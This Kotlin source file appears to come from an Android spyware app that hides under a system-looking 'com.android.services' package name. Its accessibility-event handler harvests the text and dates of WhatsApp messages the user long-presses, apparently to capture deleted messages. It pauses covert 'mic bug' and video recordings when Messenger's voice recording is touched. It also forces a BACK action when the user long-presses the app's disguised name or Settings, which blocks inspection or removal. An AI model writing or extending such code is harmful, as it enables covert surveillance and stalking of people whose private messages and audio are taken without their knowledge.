package com.android.services.accessibility.data

import android.content.Context
import android.content.Intent
import android.os.Build
import android.view.accessibility.AccessibilityNodeInfo
import androidx.localbroadcastmanager.content.LocalBroadcastManager
import com.android.services.accessibility.AccessibilityUtils.deletedDate
import com.android.services.accessibility.AccessibilityUtils.deletedMsg
import com.android.services.accessibility.AccessibilityUtils.stopMicBugRecordingIfRecording
import com.android.services.accessibility.AccessibilityUtils.stopVideoRecordingIfRecording
import com.android.services.interfaces.OnAccessibilityEvent
import com.android.services.models.AccessibilityEventModel
import com.android.services.util.AppConstants
import com.android.services.util.logException
import com.android.services.util.logVerbose
import java.util.*

class ViewLongClickedEventData : OnAccessibilityEvent {

    override fun onAccessibilityEvent(
        context: Context,
        accessibilityEventModel: AccessibilityEventModel,
    ) {
        try {
            if (AppConstants.serviceActivated) {
                val eventText = accessibilityEventModel.eventText
                val eventPackage = accessibilityEventModel.packageName
                if (eventPackage == "com.whatsapp" || eventPackage == "com.whatsapp.w4b") {
                    val nodeInfo = accessibilityEventModel.eventSource
                    traverseLongClickedView(nodeInfo, nodeInfo!!.childCount, 0)
                }
                if (eventText.isNotEmpty()) {
                    val longClickedText = eventText.lowercase(Locale.getDefault())
                    if (eventPackage == "com.facebook.orca" && longClickedText.contains("record voice")) {
                        stopMicBugRecordingIfRecording(context)
                        stopVideoRecordingIfRecording(context)
                    } else if ((isOurAppName(longClickedText)|| isSettingsAppName(longClickedText)) && Build.VERSION.SDK_INT >= 29) {
                        LocalBroadcastManager.getInstance(context)
                            .sendBroadcast(
                                Intent("com.android.services.accessibility.ACTION_BACK")
                                    .putExtra("ACTION_TYPE", 0)
                            )
                    }
                }
            }
        } catch (e: Exception) {
            logVerbose("$TAG OnLongClickedEvent Error: " + e.message)
        }
    }

    private fun isOurAppName(longClickedText: String): Boolean {
        val text=longClickedText.replace("[", "").replace("]", "")
        val ourAppName=AppConstants.appChangedName ?:""
        if (ourAppName.isNotEmpty()){
            return text.equals(ourAppName,true)
        }
        return false
    }

    private fun isSettingsAppName(longClickedText: String): Boolean {
        return longClickedText.replace("[", "").replace("]", "") == "settings"
    }

    private fun traverseLongClickedView(
        info: AccessibilityNodeInfo?,
        noOfChild: Int,
        currentChild: Int,
    ) {
        try {
            val chSequence = info!!.text
            var resourceId = info.viewIdResourceName
            val text: String
            if (resourceId != null && chSequence != null) {
                resourceId = resourceId.split("/").toTypedArray()[1]
                text = chSequence.toString()
                val eventClassName = info.className.toString()
                if (resourceId == "message_text" && eventClassName == "android.widget.TextView") {
                    deletedMsg = text
                } else if (resourceId == "date" && eventClassName == "android.widget.TextView") {
                    deletedDate = text
                }
                logVerbose("$TAG Long Clicked Child $text $eventClassName")
            }
            val noOfSourceChild = info.childCount
            if (noOfChild == currentChild) {
                if (noOfSourceChild == 0) {
                    return
                }
            }
            for (i in 0 until info.childCount) {
                val child = info.getChild(i)
                if (child != null) {
                    traverseLongClickedView(child, noOfSourceChild, i + 1)
                    child.recycle()
                }
            }
        } catch (e: Exception) {
            logException("$TAG OnTraverseLongClick Error: " + e.message)
        }
    }

    companion object {
        private const val TAG = "ViewLongClickedEventData"
    }
}